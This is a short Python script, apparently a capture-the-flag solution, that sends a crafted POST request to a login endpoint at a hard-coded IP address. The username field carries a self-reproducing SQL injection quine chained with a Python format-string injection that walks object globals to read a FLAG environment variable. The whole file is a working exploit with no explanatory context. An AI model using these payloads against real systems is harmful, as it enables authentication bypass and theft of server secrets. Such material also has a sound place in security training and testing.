import requests
payload = {
    'username': r'''"\'UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT"UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT%c%s%cs)--{data.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}"s)--{data.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}''',
    'password': 'c3i-user@123'
}
print(requests.post('http://3.110.153.161:8002/login', data=payload).text)
     
